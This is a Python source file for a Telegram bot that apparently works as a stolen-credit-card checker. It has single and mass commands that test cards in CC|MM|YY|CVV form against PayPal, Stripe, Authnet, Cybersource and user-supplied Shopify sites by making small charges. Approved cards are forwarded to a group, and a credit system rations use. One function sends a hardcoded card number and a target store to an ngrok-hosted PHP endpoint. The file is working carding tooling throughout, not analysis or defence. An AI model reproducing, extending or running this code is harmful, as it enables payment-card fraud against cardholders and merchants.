    mention = f"<a href='tg://user?id={user_id}'>{message.from_user.first_name}</a>"
    bin_number = cc.split('|')[0][:6]
    bin_info = get_bin_info(bin_number) or {}

    checking_msg = checking_status_format(cc, "3DS Lookup", bin_info)
    status_message = bot.reply_to(message, checking_msg, parse_mode='HTML')

    start_time = time.time()
    check_result = check_vbv_card(cc)
    time_taken = round(time.time() - start_time, 2)

    # Send approved to group
    if check_result["status"].upper() == "APPROVED":
        send_to_group(
            cc=cc,
            gateway=check_result["gateway"],
            response=check_result["response"],
            bin_info=bin_info,
            time_taken=time_taken,
            user_info=message.from_user
        )

    response_text = single_check_format(
        cc=cc,
        gateway=check_result["gateway"],
        response=check_result["response"],
        mention=mention,
        Userstatus=user_status,
        bin_info=bin_info,
        time_taken=time_taken,
        status=check_result["status"]
    )

    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=status_message.message_id,
        text=response_text,
        parse_mode='HTML'
    )


# Repeat same structure for py, qq, cc single checks
# Just change the check function and gateway string

@bot.message_handler(commands=['py'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.py'))
def handle_py(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)
    if not use_credits(user_id):
        bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
        return

    command_parts = message.text.split()
    if len(command_parts) < 2:
        bot.reply_to(message, "Please provide CC details in format: CC|MM|YY|CVV")
        return

    cc = command_parts[1]
    if '|' not in cc:
        bot.reply_to(message, "Invalid format. Use: CC|MM|YY|CVV")
        return

    user_status = get_user_status(user_id)
    mention = f"<a href='tg://user?id={user_id}'>{message.from_user.first_name}</a>"
    bin_number = cc.split('|')[0][:6]
    bin_info = get_bin_info(bin_number) or {}

    checking_msg = checking_status_format(cc, "Paypal [0.1$]", bin_info)
    status_message = bot.reply_to(message, checking_msg, parse_mode='HTML')

    start_time = time.time()
    check_result = check_paypal_card(cc)
    time_taken = round(time.time() - start_time, 2)

    if check_result["status"].upper() == "APPROVED":
        send_to_group(
            cc=cc,
            gateway=check_result["gateway"],
            response=check_result["response"],
            bin_info=bin_info,
            time_taken=time_taken,
            user_info=message.from_user
        )

    response_text = single_check_format(
        cc=cc,
        gateway=check_result["gateway"],
        response=check_result["response"],
        mention=mention,
        Userstatus=user_status,
        bin_info=bin_info,
        time_taken=time_taken,
        status=check_result["status"]
    )

    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=status_message.message_id,
        text=response_text,
        parse_mode='HTML'
    )


# Same for qq
@bot.message_handler(commands=['qq'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.qq'))
def handle_qq(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)
    if not use_credits(user_id):
        bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
        return

    command_parts = message.text.split()
    if len(command_parts) < 2:
        bot.reply_to(message, "Please provide CC details in format: CC|MM|YY|CVV")
        return

    cc = command_parts[1]
    if '|' not in cc:
        bot.reply_to(message, "Invalid format. Use: CC|MM|YY|CVV")
        return

    user_status = get_user_status(user_id)
    mention = f"<a href='tg://user?id={user_id}'>{message.from_user.first_name}</a>"
    bin_number = cc.split('|')[0][:6]
    bin_info = get_bin_info(bin_number) or {}

    checking_msg = checking_status_format(cc, "Stripe Square [0.20$]", bin_info)
    status_message = bot.reply_to(message, checking_msg, parse_mode='HTML')

    start_time = time.time()
    check_result = check_qq_card(cc)
    time_taken = round(time.time() - start_time, 2)

    if check_result["status"].upper() == "APPROVED":
        send_to_group(
            cc=cc,
            gateway=check_result["gateway"],
            response=check_result["response"],
            bin_info=bin_info,
            time_taken=time_taken,
            user_info=message.from_user
        )

    response_text = single_check_format(
        cc=cc,
        gateway=check_result["gateway"],
        response=check_result["response"],
        mention=mention,
        Userstatus=user_status,
        bin_info=bin_info,
        time_taken=time_taken,
        status=check_result["status"]
    )

    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=status_message.message_id,
        text=response_text,
        parse_mode='HTML'
    )


# Same for cc
@bot.message_handler(commands=['cc'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.cc'))
def handle_cc(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)
    if not use_credits(user_id):
        bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
        return

    command_parts = message.text.split()
    if len(command_parts) < 2:
        bot.reply_to(message, "Please provide CC details in format: CC|MM|YY|CVV")
        return

    cc = command_parts[1]
    if '|' not in cc:
        bot.reply_to(message, "Invalid format. Use: CC|MM|YY|CVV")
        return

    user_status = get_user_status(user_id)
    mention = f"<a href='tg://user?id={user_id}'>{message.from_user.first_name}</a>"
    bin_number = cc.split('|')[0][:6]
    bin_info = get_bin_info(bin_number) or {}

    checking_msg = checking_status_format(cc, "Site Based [1$]", bin_info)
    status_message = bot.reply_to(message, checking_msg, parse_mode='HTML')

    start_time = time.time()
    check_result = process_cc_card(cc)
    time_taken = round(time.time() - start_time, 2)

    if check_result["status"].upper() == "APPROVED":
        send_to_group(
            cc=cc,
            gateway=check_result["gateway"],
            response=check_result["response"],
            bin_info=bin_info,
            time_taken=time_taken,
            user_info=message.from_user
        )

    response_text = single_check_format(
        cc=cc,
        gateway=check_result["gateway"],
        response=check_result["response"],
        mention=mention,
        Userstatus=user_status,
        bin_info=bin_info,
        time_taken=time_taken,
        status=check_result["status"]
    )

    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=status_message.message_id,
        text=response_text,
        parse_mode='HTML'
    )


# --------------------
# MASS CHECK HANDLERS
# --------------------

# mvbv mass VBV check
@bot.message_handler(commands=['mvbv'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mvbv'))
def handle_mvbv(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)

    try:
        cards_text = None
        command_parts = message.text.split()

        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return

        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())

        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YY|CVV).")
            return

        if len(cards) > MAX_MASS_CHECK:
            cards = cards[:MAX_MASS_CHECK]
            bot.reply_to(message, f"⚠️ Maximum {MAX_MASS_CHECK} cards allowed. Checking first {MAX_MASS_CHECK} cards only.")

        if not use_credits(user_id, len(cards)):
            bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
            return

        initial_msg = f"🚀 Starting mass VBV check of {len(cards)} cards..."
        status_message = bot.reply_to(message, initial_msg)

        gateway = "3DS Lookup"
        start_time = time.time()

        def process_cards():
            results = []
            for i, card in enumerate(cards, 1):
                try:
                    result = check_vbv_card(card)
                    results.append({
                        'card': card,
                        'status': result['status'],
                        'response': result['response'],
                        'gateway': result.get('gateway', gateway)
                    })

                    # Send approved to group
                    if result["status"].upper() == "APPROVED":
                        send_to_group(
                            cc=card,
                            gateway=result["gateway"],
                            response=result["response"],
                            bin_info=get_bin_info(card.split('|')[0][:6]) or {},
                            time_taken=round(time.time() - start_time, 2),
                            user_info=message.from_user
                        )

                except Exception as e:
                    results.append({
                        'card': card,
                        'status': 'ERROR',
                        'response': f'Error: {str(e)}',
                        'gateway': gateway
                    })

                current_time = time.time() - start_time
                progress_msg = format_mass_check(results, len(cards), current_time, gateway, i)
                bot.edit_message_text(chat_id=message.chat.id, message_id=status_message.message_id,
                                      text=progress_msg, parse_mode='HTML')

            final_time = time.time() - start_time
            final_msg = format_mass_check(results, len(cards), final_time, gateway, len(cards))
            bot.edit_message_text(chat_id=message.chat.id, message_id=status_message.message_id,
                                  text=final_msg, parse_mode='HTML')

        threading.Thread(target=process_cards).start()

    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")


# mpy mass PayPal check
@bot.message_handler(commands=['mpy'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mpy'))
def handle_mpy(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)

    try:
        cards_text = None
        command_parts = message.text.split()
        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return

        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())

        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YY|CVV).")
            return

        if len(cards) > MAX_MASS_CHECK:
            cards = cards[:MAX_MASS_CHECK]
            bot.reply_to(message, f"⚠️ Maximum {MAX_MASS_CHECK} cards allowed. Checking first {MAX_MASS_CHECK} cards only.")

        if not use_credits(user_id, len(cards)):
            bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
            return

        initial_msg = f"🚀 Starting mass PayPal check of {len(cards)} cards..."
        status_message = bot.reply_to(message, initial_msg)

        gateway = "Paypal [0.1$]"
        start_time = time.time()

        def process_cards():
            results = []
            for i, card in enumerate(cards, 1):
                try:
                    result = check_paypal_card(card)
                    results.append({
                        'card': card,
                        'status': result['status'],
                        'response': result['response'],
                        'gateway': result.get('gateway', gateway)
                    })

                    # Send approved to group
                    if result["status"].upper() == "APPROVED":
                        send_to_group(
                            cc=card,
                            gateway=result["gateway"],
                            response=result["response"],
                            bin_info=get_bin_info(card.split('|')[0][:6]) or {},
                            time_taken=round(time.time() - start_time, 2),
                            user_info=message.from_user
                        )

                except Exception as e:
                    results.append({
                        'card': card,
                        'status': 'ERROR',
                        'response': f'Error: {str(e)}',
                        'gateway': gateway
                    })

                current_time = time.time() - start_time
                progress_msg = format_mass_check(results, len(cards), current_time, gateway, i)
                bot.edit_message_text(chat_id=message.chat.id, message_id=status_message.message_id,
                                      text=progress_msg, parse_mode='HTML')

            final_time = time.time() - start_time
            final_msg = format_mass_check(results, len(cards), final_time, gateway, len(cards))
            bot.edit_message_text(chat_id=message.chat.id, message_id=status_message.message_id,
                                  text=final_msg, parse_mode='HTML')

        threading.Thread(target=process_cards).start()

    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")
# Handle /mqq command
@bot.message_handler(commands=['mqq'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mqq'))
def handle_mqq(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)

    try:
        cards_text = None
        command_parts = message.text.split()

        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return

        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())

        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YY|CVV).")
            return

        if len(cards) > MAX_MASS_CHECK:
            cards = cards[:MAX_MASS_CHECK]
            bot.reply_to(message, f"⚠️ Maximum {MAX_MASS_CHECK} cards allowed. Checking first {MAX_MASS_CHECK} cards only.")

        if not use_credits(user_id, len(cards)):
            bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
            return

        initial_msg = f"🚀 Starting mass Stripe Square check of {len(cards)} cards..."
        status_message = bot.reply_to(message, initial_msg)

        gateway = "Stripe Square [0.20$]"

        initial_processing_msg = format_mass_check_processing(len(cards), 0, gateway)
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=status_message.message_id,
            text=initial_processing_msg,
            parse_mode='HTML'
        )

        start_time = time.time()

        def process_cards():
            try:
                results = []
                for i, card in enumerate(cards, 1):
                    try:
                        result = check_qq_card(card)
                        results.append({
                            'card': card,
                            'status': result['status'],
                            'response': result['response'],
                            'gateway': result.get('gateway', 'Stripe Square [0.20$]')
                        })
                    except Exception as e:
                        results.append({
                            'card': card,
                            'status': 'ERROR',
                            'response': f'Error: {str(e)}',
                            'gateway': gateway
                        })

                    current_time = time.time() - start_time
                    progress_msg = format_mass_check(results, len(cards), current_time, gateway, i)
                    bot.edit_message_text(
                        chat_id=message.chat.id,
                        message_id=status_message.message_id,
                        text=progress_msg,
                        parse_mode='HTML'
                    )

                final_time = time.time() - start_time
                final_msg = format_mass_check(results, len(cards), final_time, gateway, len(cards))
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_message.message_id,
                    text=final_msg,
                    parse_mode='HTML'
                )
            except Exception as e:
                error_msg = f"Mass Stripe Square check failed: {str(e)}"
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_message.message_id,
                    text=error_msg,
                    parse_mode='HTML'
                )

        thread = threading.Thread(target=process_cards)
        thread.start()

    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

# Handle /mcc command
@bot.message_handler(commands=['mcc'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mcc'))
def handle_mcc(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)

    try:
        cards_text = None
        command_parts = message.text.split()

        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return

        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())

        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YY|CVV).")
            return

        if len(cards) > MAX_MASS_CHECK:
            cards = cards[:MAX_MASS_CHECK]
            bot.reply_to(message, f"⚠️ Maximum {MAX_MASS_CHECK} cards allowed. Checking first {MAX_MASS_CHECK} cards only.")

        if not use_credits(user_id, len(cards)):
            bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
            return

        initial_msg = f"🚀 Starting mass Site Based check of {len(cards)} cards..."
        status_message = bot.reply_to(message, initial_msg)

        gateway = "Site Based [1$]"

        initial_processing_msg = format_mass_check_processing(len(cards), 0, gateway)
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=status_message.message_id,
            text=initial_processing_msg,
            parse_mode='HTML'
        )

        start_time = time.time()

        def process_cards():
            try:
                results = []
                for i, card in enumerate(cards, 1):
                    try:
                        result = process_cc_card(card)
                        results.append({
                            'card': card,
                            'status': result['status'],
                            'response': result['response'],
                            'gateway': result.get('gateway', 'Site Based [1$]')
                        })
                    except Exception as e:
                        results.append({
                            'card': card,
                            'status': 'ERROR',
                            'response': f'Error: {str(e)}',
                            'gateway': gateway
                        })

                    current_time = time.time() - start_time
                    progress_msg = format_mass_check(results, len(cards), current_time, gateway, i)
                    bot.edit_message_text(
                        chat_id=message.chat.id,
                        message_id=status_message.message_id,
                        text=progress_msg,
                        parse_mode='HTML'
                    )

                final_time = time.time() - start_time
                final_msg = format_mass_check(results, len(cards), final_time, gateway, len(cards))
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_message.message_id,
                    text=final_msg,
                    parse_mode='HTML'
                )
            except Exception as e:
                error_msg = f"Mass Site Based check failed: {str(e)}"
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_message.message_id,
                    text=error_msg,
                    parse_mode='HTML'
                )

        thread = threading.Thread(target=process_cards)
        thread.start()

    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")


# --------------------
# SINGLE AT CHECK
# --------------------
@bot.message_handler(commands=['at'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.at'))
def handle_at(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)
    if not use_credits(user_id):
        bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
        return

    command_parts = message.text.split()
    if len(command_parts) < 2:
        bot.reply_to(message, "Please provide CC details in format: CC|MM|YY|CVV")
        return

    cc = command_parts[1]
    if '|' not in cc:
        bot.reply_to(message, "Invalid format. Use: CC|MM|YY|CVV")
        return

    user_status = get_user_status(user_id)
    mention = f"<a href='tg://user?id={user_id}'>{message.from_user.first_name}</a>"
    bin_number = cc.split('|')[0][:6]
    bin_info = get_bin_info(bin_number) or {}

    checking_msg = checking_status_format(cc, "Authnet [5$]", bin_info)
    status_message = bot.reply_to(message, checking_msg, parse_mode='HTML')

    start_time = time.time()
    check_result = process_card_at(cc)
    time_taken = round(time.time() - start_time, 2)

    if check_result["status"].upper() == "APPROVED":
        send_to_group(
            cc=cc,
            gateway=check_result["gateway"],
            response=check_result["response"],
            bin_info=bin_info,
            time_taken=time_taken,
            user_info=message.from_user
        )

    response_text = single_check_format(
        cc=cc,
        gateway=check_result["gateway"],
        response=check_result["response"],
        mention=mention,
        Userstatus=user_status,
        bin_info=bin_info,
        time_taken=time_taken,
        status=check_result["status"]
    )

    bot.edit_message_text(chat_id=message.chat.id, message_id=status_message.message_id,
                          text=response_text, parse_mode='HTML')


# Handle /mat command
@bot.message_handler(commands=['mat'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mat'))
def handle_mat(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)

    try:
        cards_text = None
        command_parts = message.text.split()

        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return

        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())

        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YY|CVV).")
            return

        if len(cards) > MAX_MASS_CHECK:
            cards = cards[:MAX_MASS_CHECK]
            bot.reply_to(message, f"⚠️ Maximum {MAX_MASS_CHECK} cards allowed. Checking first {MAX_MASS_CHECK} cards only.")

        if not use_credits(user_id, len(cards)):
            return

        initial_msg = f"🚀 Starting mass AT check of {len(cards)} cards..."
        status_message = bot.reply_to(message, initial_msg)

        try:
            first_card_result = process_card_at(cards[0])
            gateway = first_card_result.get("gateway", "Authnet [5$]")
        except:
            gateway = "Authnet [5$]"

        initial_processing_msg = format_mass_check_processing(len(cards), 0, gateway)
        bot.edit_message_text(
            chat_id=message.chat.id,
            message_id=status_message.message_id,
            text=initial_processing_msg,
            parse_mode='HTML'
        )

        start_time = time.time()

        def process_cards():
            try:
                results = []
                with concurrent.futures.ThreadPoolExecutor(max_workers=3) as executor:
                    future_to_card = {executor.submit(process_card_at, card): card for card in cards}
                    for i, future in enumerate(concurrent.futures.as_completed(future_to_card), 1):
                        card = future_to_card[future]
                        try:
                            result = future.result()
                            results.append({
                                'card': card,
                                'status': result['status'],
                                'response': result['response'],
                                'gateway': result.get('gateway', 'Authnet [5$]')
                            })
                        except Exception as e:
                            results.append({
                                'card': card,
                                'status': 'ERROR',
                                'response': f'Error: {str(e)}',
                                'gateway': gateway
                            })

                        current_time = time.time() - start_time
                        progress_msg = format_mass_check(results, len(cards), current_time, gateway, i)
                        bot.edit_message_text(
                            chat_id=message.chat.id,
                            message_id=status_message.message_id,
                            text=progress_msg,
                            parse_mode='HTML'
                        )

                final_time = time.time() - start_time
                final_msg = format_mass_check(results, len(cards), final_time, gateway, len(cards))
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_message.message_id,
                    text=final_msg,
                    parse_mode='HTML'
                )
            except Exception as e:
                error_msg = f"Mass AT check failed: {str(e)}"
                bot.edit_message_text(
                    chat_id=message.chat.id,
                    message_id=status_message.message_id,
                    text=error_msg,
                    parse_mode='HTML'
                )

        thread = threading.Thread(target=process_cards)
        thread.start()

    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

# Handle /ar command
@bot.message_handler(commands=['ar'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.ar'))
def handle_ar(message):
    # --- Helper: extract CC from messy text ---
    def extract_cc(text: str):
        if not text:
            return None

        # Normalize separators into "|"
        cleaned = re.sub(r'[\s:/\.\-\\]+', '|', text.strip())

        # Pattern for CC + MM + YY/YYYY + CVV
        match = re.search(r'(\d{12,19})\|?(\d{1,2})\|?(\d{2,4})\|?(\d{3,4})', cleaned)
        if match:
            cc, mm, yy, cvv = match.groups()

            # Fix year (if 4 digits → convert to last 2)
            if len(yy) == 4:
                yy = yy[-2:]

            # Ensure 2-digit month
            mm = mm.zfill(2)

            return f"{cc}|{mm}|{yy}|{cvv}"

        return None

    # --- User credit system ---
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)
    if not use_credits(user_id):
        bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
        return

    # --- Step 1: Get raw text (after command or from reply) ---
    command_parts = message.text.split(maxsplit=1)
    raw_input = None

    if len(command_parts) > 1:
        raw_input = command_parts[1]
    elif message.reply_to_message:  
        if message.reply_to_message.text:
            raw_input = message.reply_to_message.text
        elif message.reply_to_message.caption:
            raw_input = message.reply_to_message.caption

    if not raw_input:
        bot.reply_to(message, "❌ Please provide CC details or reply to a message containing them.")
        return

    # --- Step 2: Extract CC ---
    cc = extract_cc(raw_input)
    if not cc:
        bot.reply_to(message, "❌ No valid CC found. Use format: CC|MM|YY|CVV")
        return

    # --- Step 3: BIN lookup + user mention ---
    user_status = get_user_status(message.from_user.id)
    mention = f"<a href='tg://user?id={message.from_user.id}'>{message.from_user.first_name}</a>"
    bin_number = cc.split('|')[0][:6]
    bin_info = get_bin_info(bin_number) or {}

    # --- Step 4: Send "checking..." message ---
    checking_msg = checking_status_format(cc, "Cybersource Authnet", bin_info)
    status_message = bot.reply_to(message, checking_msg, parse_mode='HTML')

    # --- Step 5: Run AR check ---
    start_time = time.time()
    check_result = process_ar_card(cc)  # This calls the function from ar.py
    end_time = time.time()
    time_taken = round(end_time - start_time, 2)

    # --- Step 6: If approved → send to group ---
    if check_result["status"].upper() == "APPROVED":
        send_to_group(
            cc=cc,
            gateway=check_result["gateway"],
            response=check_result["response"],
            bin_info=bin_info,
            time_taken=time_taken,
            user_info=message.from_user
        )

    # --- Step 7: Final response ---
    response_text = single_check_format(
        cc=cc,
        gateway=check_result["gateway"],
        response=check_result["response"],
        mention=mention,
        Userstatus=user_status,
        bin_info=bin_info,
        time_taken=time_taken,
        status=check_result["status"]
    )

    bot.edit_message_text(
        chat_id=message.chat.id,
        message_id=status_message.message_id,
        text=response_text,
        parse_mode='HTML'
    )

# Handle /mar command
@bot.message_handler(commands=['mar'])
@bot.message_handler(func=lambda m: m.text and m.text.startswith('.mar'))
def handle_mar(message):
    user_id = message.from_user.id
    init_user(user_id, message.from_user.username)

    try:
        cards_text = None
        command_parts = message.text.split()

        if len(command_parts) > 1:
            cards_text = ' '.join(command_parts[1:])
        elif message.reply_to_message:
            cards_text = message.reply_to_message.text
        else:
            bot.reply_to(message, "❌ Please provide cards after command or reply to a message containing cards.")
            return

        # Extract cards
        cards = []
        for line in cards_text.split('\n'):
            line = line.strip()
            if line:
                for card in line.split():
                    if '|' in card:
                        cards.append(card.strip())

        if not cards:
            bot.reply_to(message, "❌ No valid cards found in the correct format (CC|MM|YY|CVV).")
            return

        if len(cards) > MAX_MASS_CHECK:
            cards = cards[:MAX_MASS_CHECK]
            bot.reply_to(message, f"⚠️ Maximum {MAX_MASS_CHECK} cards allowed. Checking first {MAX_MASS_CHECK} cards only.")

        if not use_credits(user_id, len(cards)):
            bot.reply_to(message, "❌ You don't have enough credits. Wait for your credits to reset.")
            return

        initial_msg = f"🚀 Starting mass Cybersource Authnet check of {len(cards)} cards..."
        status_message = bot.reply_to(message, initial_msg)

        gateway = "Cybersource Authnet"
        start_time = time.time()

        def process_cards():
            results = []
            for i, card in enumerate(cards, 1):
                try:
                    result = process_ar_card(card)
                    results.append({
                        'card': card,
                        'status': result['status'],
                        'response': result['response'],
                        'gateway': result.get('gateway', gateway)
                    })

                    # Send approved to group
                    if result["status"].upper() == "APPROVED":
                        send_to_group(
                            cc=card,
                            gateway=result["gateway"],
                            response=result["response"],
                            bin_info=get_bin_info(card.split('|')[0][:6]) or {},
                            time_taken=round(time.time() - start_time, 2),
                            user_info=message.from_user
                        )

                except Exception as e:
                    results.append({
                        'card': card,
                        'status': 'ERROR',
                        'response': f'Error: {str(e)}',
                        'gateway': gateway
                    })

                current_time = time.time() - start_time
                progress_msg = format_mass_check(results, len(cards), current_time, gateway, i)
                bot.edit_message_text(chat_id=message.chat.id, message_id=status_message.message_id,
                                      text=progress_msg, parse_mode='HTML')

            final_time = time.time() - start_time
            final_msg = format_mass_check(results, len(cards), final_time, gateway, len(cards))
            bot.edit_message_text(chat_id=message.chat.id, message_id=status_message.message_id,
                                  text=final_msg, parse_mode='HTML')

        threading.Thread(target=process_cards).start()

    except Exception as e:
        bot.reply_to(message, f"❌ An error occurred: {str(e)}")

def test_shopify_site(url):
    """Test if a Shopify site is reachable and working with a test card"""
    try:
        # Use the fixed test card instead of generating random one
        test_card = "5547300001996183|11|2028|197"
        
        api_url = f"https://7feeef80303d.ngrok-free.app/autosh.php?cc={test_card}&site={url}"
        response = requests.get(api_url, timeout=100)
        
        if response.status_code != 200:
            return False, "Site not reachable", "0.0", "shopify_payments", "No response"
            
        response_text = response.text
        
        # Parse response
        price = "1.0"  # default
        gateway = "shopify_payments"  # default
        api_message = "No response"
        
        try:
            if '"Response":"' in response_text:
                api_message = response_text.split('"Response":"')[1].split('"')[0]
            if '"Price":"' in response_text:
                price = response_text.split('"Price":"')[1].split('"')[0]
            if '"Gateway":"' in response_text:
                gateway = response_text.split('"Gateway":"')[1].split('"')[0]
        except:
            pass
            
        return True, api_message, price, gateway, "Site is reachable and working"
        
    except Exception as e:
        return False, f"Error testing site: {str(e)}", "0.0", "shopify_payments", "Error"

@bot.message_handler(commands=['seturl'])
def handle_seturl(message):
    try:
        user_id = str(message.from_user.id)
        parts = message.text.split(maxsplit=1)
        
        if len(parts) < 2:
            bot.reply_to(message, "Usage: /seturl <your_shopify_site_url>")
            return
            
        url = parts[1].strip()
        
        # Validate URL format
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
            
        # Check if URL is valid Shopify site
        status_msg = bot.reply_to(message, f"🔄 Adding URL: <code>{url}</code>\nTesting reachability...", parse_mode='HTML')
        
        # Phase 1: Basic URL check
        try:
            parsed = urlparse(url)
            if not parsed.netloc:
                raise ValueError("Invalid URL format")
        except Exception as e:
            bot.edit_message_text(chat_id=message.chat.id,
                                message_id=status_msg.message_id,
                                text=f"❌ Invalid URL format: {str(e)}")
            return
            
        # Phase 2: Test reachability
        bot.edit_message_text(chat_id=message.chat.id,
                            message_id=status_msg.message_id,
                            text=f"🔄 Testing URL: <code>{url}</code>\nTesting with test card...",
                            parse_mode='HTML')
        
        # Phase 3: Test with test card
        is_valid, api_message, price, gateway, test_message = test_shopify_site(url)
        if not is_valid:
            bot.edit_message_text(chat_id=message.chat.id,
                                message_id=status_msg.message_id,
                                text=f"❌ Failed to verify Shopify site:\n{test_message}\nPlease check your URL and try again.")
            return
            
        # Store the URL with price
        USER_SITES[user_id] = {
            'url': url,
            'price': price
        }
        save_user_sites()
        
        bot.edit_message_text(chat_id=message.chat.id,
                            message_id=status_msg.message_id,
                            text=f"""
<a href='https://t.me/stormxvup'>┏━━━━━━━⍟</a>
<a href='https://t.me/stormxvup'>┃ 𝗦𝗶𝘁𝗲 𝗔𝗱𝗱𝗲𝗱 ✅</a>
<a href='https://t.me/stormxvup'>┗━━━━━━━━━━━⊛</a>
                            
<a href='https://t.me/stormxvup'>[⸙]</a>❖ 𝗦𝗶𝘁𝗲 ➳ <code>{url}</code>
<a href='https://t.me/stormxvup'>[⸙]</a>❖ 𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 ➳ {api_message}
<a href='https://t.me/stormxvup'>[⸙]</a>❖ 𝗔𝗺𝗼𝘂𝗻𝘁 ➳ ${price}

<i>You can now check cards with /sh command</i>
─────── ⸙ ────────
""",
                            parse_mode='HTML')
        
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

@bot.message_handler(commands=['rmurl'])
def handle_rmurl(message):
    try:
        user_id = str(message.from_user.id)
        
        if user_id not in USER_SITES:
            bot.reply_to(message, "You don't have any site to remove. Add a site with /seturl")
            return
            
        del USER_SITES[user_id]
        save_user_sites()
        bot.reply_to(message, "✅ Your Shopify site has been removed successfully.")
        
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

@bot.message_handler(commands=['myurl'])
def handle_myurl(message):
    try:
        user_id = str(message.from_user.id)
        
        if user_id not in USER_SITES:
            bot.reply_to(message, "You haven't added any site yet. Add a site with /seturl <your_shopify_url>")
            return
            
        site_info = USER_SITES[user_id]
        bot.reply_to(message, f"""Your Shopify site details:

URL: <code>{site_info['url']}</code>
Default Amount: ${site_info.get('price', '1.0')}

Use /sh command to check cards""", parse_mode='HTML')
        
    except Exception as e:
        bot.reply_to(message, f"Error: {str(e)}")

def check_shopify_cc(cc, site_info):
    try:
        # Normalize card input
        card = cc.replace('/', '|').replace(':', '|').replace(' ', '|')
        parts = [x.strip() for x in card.split('|') if x.strip()]
        
        if len(parts) < 4:
            return {
                'status': 'ERROR', 
                'card': cc, 
                'message': 'Invalid format',
                'brand': 'UNKNOWN', 
                'country': 'UNKNOWN 🇺🇳', 
                'type': 'UNKNOWN',
                'gateway': f"Self Shopify [${site_info.get('price', '1.0')}]",
                'price': site_info.get('price', '1.0')
            }

        cc_num, mm, yy_raw, cvv = parts[:4]
        mm = mm.zfill(2)
        yy = yy_raw[2:] if yy_raw.startswith("20") and len(yy_raw) == 4 else yy_raw
